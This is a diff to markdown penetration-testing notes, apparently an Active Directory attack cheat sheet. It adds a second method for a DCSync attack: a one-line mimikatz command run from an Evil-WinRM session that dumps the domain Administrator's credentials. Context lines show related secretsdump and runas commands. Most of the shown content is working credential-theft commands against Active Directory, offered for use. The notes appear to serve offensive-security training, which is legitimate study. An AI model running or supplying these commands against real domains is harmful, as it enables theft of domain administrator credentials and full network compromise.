@@ -770,6 +770,7 @@ secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDom
 
 #### Mimikatz
 
+##### Way 1:
 Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:
 
 ```cmd-session
@@ -781,7 +782,6 @@ runas /netonly /user:$domain\$userSamAccountName powershell
 And now, from powershell:
 
 ```powershell
-
 .\mimikatz.exe
 
 #########
@@ -789,8 +789,18 @@ And now, from powershell:
 ########
 
 lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
-
 ```
+
+##### Way 2:
+
+If we have access to the host with an user who has DCSync privileges (DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege) on the domain, we can run from powershell the attack in one line:
+
+```powershell
+# From my Evil-WinRm Connection:
+.\mimikatz.exe privilege::debug "lsadump::dcsync
+/domain:$domain /user:Administrator" exit
+```
+
 
 ## ⛔ Privileged Access
 
